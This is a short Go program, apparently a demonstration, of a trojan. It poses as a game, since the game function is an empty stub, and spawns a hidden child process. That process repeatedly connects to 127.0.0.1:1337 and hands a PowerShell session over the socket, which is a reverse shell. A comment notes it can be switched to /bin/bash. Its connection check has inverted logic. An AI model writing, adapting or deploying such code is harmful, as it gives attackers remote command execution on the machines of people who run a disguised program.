package main

import (
	"net"
	"os"
	"os/exec"
	"time"
)

// change this to `/bin/bash` if you wish to use this on unix
func runPowershell(conn net.Conn) {
	cmd := exec.Command("powershell")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
}

func isConnectionAlive(conn net.Conn) bool {
	if conn == nil {
		return false
	}
	buf := make([]byte, 0)
	_, err := conn.Read(buf)
	if err != nil {
		return true
	}
	return false
}

func isMalware() bool {
	args := os.Args[1:]
	for _, arg := range args {
		if arg == "MALWARE" {
			return true
		}
	}
	return false
}

func startMalwareProcess() {
	args := os.Args[1:]
	args = append(args, "MALWARE")
	command := exec.Command(os.Args[0], args...)
	command.Run()
}

func main() {
	if isMalware() {
		runPayload()
		return
	}
	startMalwareProcess()
	startGame()
}

func startGame() {
	// here you will, y'know, play the actual game haha
}

func runPayload() {
	var activeConnection net.Conn = nil
	for {
		if !isConnectionAlive(activeConnection) {
			conn, err := net.Dial("tcp", "127.0.0.1:1337")
			if err != nil {
				continue
			}
			activeConnection = conn

			go runPowershell(activeConnection)
		}
		time.Sleep(time.Second * 10)
	}
}
